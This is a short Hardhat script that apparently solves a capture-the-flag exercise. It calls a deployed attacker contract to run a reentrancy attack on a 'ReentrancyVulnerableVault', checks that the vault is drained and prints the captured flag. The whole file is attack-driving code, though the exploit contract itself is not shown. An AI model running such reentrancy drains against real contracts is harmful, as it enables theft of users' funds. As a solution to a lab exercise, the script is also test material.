const { ethers } = require("hardhat");

async function main() {
  // Your deployed attacker contract address
  const attackerAddress = "0x23481bBE80242188b0D1e3A7BDe3011f222e9fCb";

  // Get attacker contract instance
  const attacker = await ethers.getContractAt("ReentrancyAttackerSolution", attackerAddress);

  console.log("Launching reentrancy attack...");
  // Send some ETH with the attack (0.1 ETH should be enough)
  const tx = await attacker.attack({ value: ethers.parseEther("0.1") });
  await tx.wait();
  console.log("✅ Attack executed.");

  console.log("Checking if vault was drained...");
  const vaultAddress = await attacker.vault();
  const vault = await ethers.getContractAt("ReentrancyVulnerableVault", vaultAddress);
  const drained = await vault.vaultDrained();
  console.log(`Vault drained: ${drained}`);

  if (drained) {
    const flag = await attacker.getFlag();
    console.log("🎯 Flag captured:", flag);
  } else {
    console.log("⚠️ Attack failed — vault not drained.");
    
    // Let's check some debug information
    const counter = await attacker.attackCounter();
    console.log(`Attack counter: ${counter}`);
    
    const vaultCounter = await vault.withdrawalCounter();
    console.log(`Vault withdrawal counter: ${vaultCounter}`);
  }
}

main().catch((err) => {
  console.error("❌ Attack script failed:", err.message);
  process.exitCode = 1;
});